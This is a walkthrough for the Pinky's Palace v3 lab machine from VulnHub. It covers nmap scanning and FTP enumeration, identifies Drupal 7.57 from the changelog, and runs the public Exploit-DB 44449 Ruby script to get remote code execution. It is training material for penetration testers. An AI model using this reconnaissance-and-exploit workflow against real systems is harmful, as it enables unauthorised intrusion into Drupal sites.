# Pinky's Palace: v3

- **Machine:** Pinky's Palace: v3
- **Download:** https://www.vulnhub.com/entry/pinkys-palace-v3,237/

![](831-1.png)

---

# Setup

1. Import the OVA file into VirtualBox.
2. Click **Finish**.
3. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](831-2.png)

---

## Full Nmap Scan

Perform a complete scan to identify open ports, services, operating system, and default NSE script results.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.187
```

![](831-3.png)

---

## Optional Enumeration

```bash
nmap -v -p- 192.168.2.187
```

```bash
nmap -sC -sV -A 192.168.2.187
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script against the web service.

```bash
nmap -v -p 8000 -sT -sV -A --script=http-enum.nse 192.168.2.187
```

![](831-4.png)

---

# FTP Enumeration

Connect to the FTP service.

```bash
ftp 192.168.2.187
```

![](831-5.png)

List the available files.

```bash
ls
```

Download the welcome file.

```bash
get WELCOME
```

![](831-6.png)

Read the downloaded file.

```bash
cat WELCOME
```

![](831-7.png)

The welcome message indicates that the web application is the primary attack surface.

---

# Web Enumeration

Visit the web application.

```text
http://192.168.2.187:8000/
```

Also inspect the changelog.

```text
http://192.168.2.187:8000/CHANGELOG.txt
```

![](831-8.png)

The changelog reveals that the target is running **Drupal 7.57**.

---

# Vulnerability Identification

Search for publicly available exploits.

```bash
searchsploit drupal 7.57
```

![](831-9.png)

A suitable exploit is available on Exploit-DB.

```text
https://www.exploit-db.com/exploits/44449
```

![](831-10.png)

Download the exploit script.

---

# Initial Access

Execute the exploit against the target.

```bash
ruby 44449.rb 192.168.2.187:8000
```

![](831-11.png)

The exploit successfully gains remote code execution on the Drupal application.

---

# Key Learning

- Enumerate all available services before focusing on a single attack vector.
- FTP services may provide useful hints even when they do not expose sensitive credentials.
- Always review application changelogs to determine the exact software version.
- Use **SearchSploit** to locate known public vulnerabilities.
- Match the discovered software version with the appropriate Exploit-DB entry before exploitation.

---

# Summary

The machine was enumerated using Nmap, revealing FTP and a Drupal web application running on port **8000**. The FTP service contained only a welcome message, but the Drupal **CHANGELOG.txt** disclosed the exact application version (**Drupal 7.57**). Using SearchSploit, a corresponding public exploit (**Exploit-DB 44449**) was identified and executed, resulting in successful remote code execution and initial access to the target.